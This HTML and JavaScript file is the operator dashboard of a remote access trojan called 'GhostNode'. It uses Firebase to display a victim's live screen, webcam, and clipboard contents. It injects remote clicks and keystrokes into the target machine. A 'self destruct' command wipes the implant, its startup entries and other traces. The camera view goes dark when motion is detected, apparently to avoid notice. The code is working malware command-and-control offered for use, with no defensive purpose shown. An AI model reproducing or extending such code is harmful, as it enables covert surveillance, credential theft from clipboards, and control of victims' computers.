<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost Control Panel - RealTime</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        #remote-cursor { position: absolute; pointer-events: none; width: 12px; height: 12px; background: red; border: 2px solid white; border-radius: 50%; transition: all 0.1s linear; z-index: 100; }
        .motion-alert { animation: pulse-red 1s infinite; }
        @keyframes pulse-red { 0%, 100% { background: rgba(220, 38, 38, 0.1); border-color: red; } 50% { background: rgba(220, 38, 38, 0.4); border-color: white; } }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
    </style>
</head>
<body class="bg-[#020617] text-slate-200 min-h-screen font-sans">

    <!-- Navbar -->
    <nav class="p-4 border-b border-slate-800 glass sticky top-0 z-[110] flex justify-between items-center">
        <div class="flex items-center gap-3">
            <div id="connection-dot" class="w-3 h-3 bg-red-500 rounded-full"></div>
            <h1 class="font-black tracking-tighter text-xl italic text-white">GHOST<span class="text-blue-500">NODE</span></h1>
        </div>
        <div class="flex gap-2">
            <button onclick="sendCommand('reset_camera')" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-[10px] font-bold transition">RESTART CAMERA</button>
            <button onclick="confirmDestruct()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded text-[10px] font-bold transition">SELF DESTRUCT</button>
        </div>
    </nav>

    <main class="p-4 grid grid-cols-12 gap-4">
        <!-- Screen Section -->
        <div class="col-span-12 lg:col-span-8 space-y-4">
            <div class="glass p-1 rounded-xl relative overflow-hidden bg-black group" id="screen-container">
                <div id="remote-cursor"></div>
                <img id="live-screen" src="" class="w-full h-auto min-h-[300px] object-contain cursor-crosshair" 
                     alt="Waiting for target connection..." onclick="handleScreenClick(event)">
                <div class="absolute top-4 left-4 bg-black/60 px-2 py-1 rounded text-[9px] font-mono text-white/70 border border-white/10 uppercase">
                    Live Stream
                </div>
            </div>
            
            <div class="glass p-3 rounded-xl flex gap-2 shadow-xl">
                <input id="key-input" type="text" placeholder="Type text to send to target machine..." 
                       class="bg-slate-900 border border-slate-700 px-4 py-2 rounded flex-1 text-sm outline-none focus:border-blue-500 transition-all font-mono">
                <button onclick="sendText()" class="bg-white text-black px-6 py-2 rounded font-black text-xs hover:bg-blue-500 hover:text-white transition-colors">PRESS ENTER</button>
            </div>
        </div>

        <!-- Sidebar Section -->
        <div class="col-span-12 lg:col-span-4 space-y-4">
            <!-- Camera Display -->
            <div id="cam-box" class="glass p-2 rounded-xl aspect-video flex items-center justify-center relative bg-black overflow-hidden border-2 border-transparent">
                <img id="live-camera" src="" class="w-full h-full object-cover rounded-lg hidden">
                <div id="cam-placeholder" class="text-center">
                    <div class="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-2 border border-slate-700">
                        <svg class="w-5 h-5 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                    </div>
                    <p id="cam-status" class="text-[10px] font-mono text-slate-500 uppercase tracking-tighter">Standby</p>
                </div>
                <div class="absolute bottom-3 right-3 flex items-center gap-1.5 bg-black/50 px-2 py-1 rounded backdrop-blur-sm border border-white/5">
                    <span id="cam-dot" class="w-1.5 h-1.5 bg-slate-600 rounded-full"></span>
                    <span id="cam-label" class="text-[8px] font-black uppercase text-slate-300">Off</span>
                </div>
            </div>

            <!-- Clipboard/Log History -->
            <div class="glass p-4 rounded-xl flex-1 flex flex-col gap-3 min-h-[350px]">
                <div class="flex justify-between items-center border-b border-slate-800 pb-2">
                    <h3 class="text-[10px] font-bold text-blue-400 uppercase tracking-widest">Clipboard Feed</h3>
                    <span class="text-[8px] text-slate-500 font-mono">Real-time</span>
                </div>
                <div id="clipboard-list" class="space-y-2 overflow-y-auto max-h-[400px] text-[11px] font-mono pr-1">
                    <div class="text-slate-600 italic">Waiting for clipboard data...</div>
                </div>
            </div>
        </div>
    </main>

    <!-- Self Destruct Modal -->
    <div id="destruct-overlay" class="fixed inset-0 bg-black/95 backdrop-blur-md z-[200] hidden flex-col items-center justify-center p-6 text-center">
        <div class="w-20 h-20 border-4 border-red-600 border-t-transparent rounded-full animate-spin mb-6"></div>
        <h2 class="text-2xl font-black text-red-500 uppercase italic mb-2">System Purge Initiated</h2>
        <p class="text-slate-400 max-w-sm text-sm font-mono leading-relaxed">Wiping executable, cleaning startup entries, and deleting traces. The connection will close permanently in 2 seconds.</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        // Environment check for Firebase Config
        const configRaw = typeof __firebase_config !== 'undefined' ? __firebase_config : null;
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'sainfoxiya-com-a7733';

        if (configRaw) {
            const config = JSON.parse(configRaw);
            const app = initializeApp(config);
            const db = getFirestore(app);
            const auth = getAuth(app);

            signInAnonymously(auth).then(() => {
                document.getElementById('connection-dot').classList.replace('bg-red-500', 'bg-green-500');
                
                // 1. Live Screen Stream
                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), s => {
                    if(!s.exists()) return;
                    const d = s.data();
                    const screenImg = document.getElementById('live-screen');
                    if(d.frame) screenImg.src = d.frame;
                    
                    const c = document.getElementById('remote-cursor');
                    c.style.left = (d.cursorX * 100) + '%';
                    c.style.top = (d.cursorY * 100) + '%';
                });

                // 2. Camera & Motion detection
                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), s => {
                    if(!s.exists()) return;
                    const d = s.data();
                    const img = document.getElementById('live-camera');
                    const stat = document.getElementById('cam-status');
                    const box = document.getElementById('cam-box');
                    const dot = document.getElementById('cam-dot');
                    const label = document.getElementById('cam-label');
                    const placeholder = document.getElementById('cam-placeholder');
                    
                    if(d.frame && !d.motion) {
                        img.src = d.frame;
                        img.classList.remove('hidden');
                        placeholder.classList.add('hidden');
                        stat.innerText = "LIVE";
                        dot.className = "w-1.5 h-1.5 bg-green-500 rounded-full";
                        label.innerText = "Live";
                        box.classList.remove('motion-alert');
                    } else if (d.motion) {
                        img.classList.add('hidden');
                        placeholder.classList.remove('hidden');
                        stat.innerText = "OFF (MOTION DETECTED)";
                        dot.className = "w-1.5 h-1.5 bg-red-600 rounded-full animate-pulse";
                        label.innerText = "Motion Alert";
                        box.classList.add('motion-alert');
                    } else {
                        img.classList.add('hidden');
                        placeholder.classList.remove('hidden');
                        stat.innerText = d.status || "STANDBY";
                        dot.className = "w-1.5 h-1.5 bg-slate-600 rounded-full";
                        label.innerText = "Off";
                        box.classList.remove('motion-alert');
                    }
                });

                // 3. Clipboard Feed
                const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(15));
                onSnapshot(q, s => {
                    const l = document.getElementById('clipboard-list');
                    l.innerHTML = '';
                    if(s.empty) l.innerHTML = '<div class="text-slate-600 italic">No clipboard history...</div>';
                    s.forEach(doc => {
                        const item = document.createElement('div');
                        item.className = "bg-slate-900 p-2 rounded border-l-2 border-blue-600 break-all text-blue-100/80 mb-2";
                        item.innerText = doc.data().text;
                        l.appendChild(item);
                    });
                });

                // Global function to push actions to Firebase
                window.sendCommand = (type, extra = {}) => {
                    addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
                        type, ...extra, timestamp: serverTimestamp()
                    });
                };
            }).catch(e => console.error("Auth Failure:", e));
        } else {
            document.getElementById('live-screen').alt = "Local Preview: Deployment Required for Live Socket Connection.";
            console.warn("GhostNode: No Firebase configuration found. Please deploy to see real-time interaction.");
        }

        // Action Handlers
        window.sendText = () => {
            const i = document.getElementById('key-input');
            if(i.value && window.sendCommand) { 
                sendCommand('text', { value: i.value }); 
                i.value = ''; 
            }
        };

        window.handleScreenClick = (e) => {
            const r = e.target.getBoundingClientRect();
            const x = (e.clientX - r.left) / r.width;
            const y = (e.clientY - r.top) / r.height;
            if(window.sendCommand) sendCommand('click', { relX: x, relY: y });
        };

        window.confirmDestruct = () => {
            if(confirm("DANGER: Wiping all traces and files from the target machine. This cannot be undone. Proceed?")) {
                if(window.sendCommand) {
                    sendCommand('self_destruct');
                    document.getElementById('destruct-overlay').classList.replace('hidden', 'flex');
                }
            }
        };

        // Listen for Enter key on input
        document.getElementById('key-input').addEventListener('keypress', (e) => {
            if(e.key === 'Enter') sendText();
        });

    </script>
</body>
</html>
